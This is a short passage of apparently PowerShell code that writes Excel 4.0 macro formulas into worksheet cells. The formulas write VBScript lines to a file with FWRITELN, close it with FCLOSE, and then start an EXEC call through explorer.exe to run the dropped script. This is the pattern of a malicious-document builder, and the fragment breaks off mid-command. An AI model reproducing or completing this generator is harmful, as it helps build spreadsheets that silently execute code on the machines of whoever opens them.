      2`")" $sheet.Cells.Item(17,1) = "=FWRITELN(A5, `"oStream.Close`")" $sheet.Cells.Item(18,1) = "=FWRITELN(A5, `"End If`")" $sheet.Cells.Item(19,1) = "=FCLOSE(A5)" $sheet.Cells.Item(20,1) = "=EXEC(`"explorer.exe
